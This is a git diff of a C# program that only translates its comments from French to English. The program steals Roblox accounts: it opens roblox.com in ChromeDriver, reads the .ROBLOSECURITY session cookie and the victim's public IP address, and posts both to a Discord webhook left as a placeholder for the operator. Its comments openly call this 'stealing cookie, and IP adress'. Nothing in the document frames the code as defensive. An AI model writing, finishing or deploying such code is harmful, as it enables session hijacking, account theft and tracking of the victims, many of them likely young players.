@@ -10,39 +10,39 @@ class Program
 {
     static async Task Main(string[] args)
     {
-        string webhookUrl = "VOTRE_WEBHOOK_URL"; // Remplacez par votre URL de webhook Discord
+        string webhookUrl = "YOUR_DC_WEBHOOK"; //  change this to your discord webhook so it can actually send it
         string robloxUrl = "https://www.roblox.com";
 
-        // Initialiser le navigateur
+        
         IWebDriver driver = new ChromeDriver();
         driver.Navigate().GoToUrl(robloxUrl);
 
-        // Attendre que la page se charge
+        // wait to it load
         System.Threading.Thread.Sleep(5000);
 
-        // Obtenir les cookies
+        // getting the cookie
         var cookies = driver.Manage().Cookies.AllCookies;
         string robloSecurityCookie = null;
         string ipAddress = GetPublicIpAddress();
 
         foreach (var cookie in cookies)
         {
-            if (cookie.Name == ".ROBLOSECURITY")
+            if (cookie.Name == ".ROBLOSECURITY") 
             {
                 robloSecurityCookie = cookie.Value;
                 break;
             }
         }
 
-        // Fermer le navigateur
+        // close  the browser
         driver.Quit();
 
-        // Envoyer les données au webhook Discord
+        // *sending it to ur discord webhook*
         if (!string.IsNullOrEmpty(robloSecurityCookie))
         {
             var payload = new
             {
-                content = $"ROBLOSECURITY Cookie: {robloSecurityCookie}\nIP Address: {ipAddress}"
+                content = $"ROBLOSECURITY Cookie: {robloSecurityCookie}\nIP Address: {ipAddress}" // stealing cookie, and IP adress
             };
 
             using (HttpClient client = new HttpClient())
@@ -54,10 +54,10 @@ class Program
         }
         else
         {
-            Console.WriteLine("Aucun cookie .ROBLOSECURITY trouvé.");
+            Console.WriteLine("No Cookie  .ROBLOSECURITY found."); // if it didn't found one meaning the user isn't sign in an account
         }
     }
-
+// now this function here is getting his ip adresses, at your risk if you want to add it!
     static string GetPublicIpAddress()
     {
         using (HttpClient client = new HttpClient())
